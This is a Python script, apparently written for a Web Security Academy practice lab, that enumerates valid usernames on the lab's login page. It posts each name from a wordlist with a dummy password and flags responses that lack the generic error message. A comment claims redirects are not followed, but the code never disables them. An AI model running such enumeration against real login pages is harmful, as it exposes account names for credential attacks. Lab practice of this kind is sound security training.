import requests

URL = "https://0a7c00060403afd6806b213600c5007d.web-security-academy.net/login"
normal_error = 'Invalid username or password.'

with open("expanded_list.txt", "r") as f:
    usernames = f.read().splitlines()

print("[*] ユーザー名の列挙を開始します！")

session = requests.Session()
found_users = set()

for username in usernames:
    data = {
        "username": username,
        "password": 'a'
    }

    # リダイレクト有無を判定するため、POST後に自動追従しない
    response = session.post(URL, data=data, timeout=10)
    if normal_error not in response.text:
        if username not in found_users:
            print(f'検知メッセージ：{response.text[500:700].strip()}')
            print(f'{username}ユーザーの存在が確認されました。')

            found_users.add(username)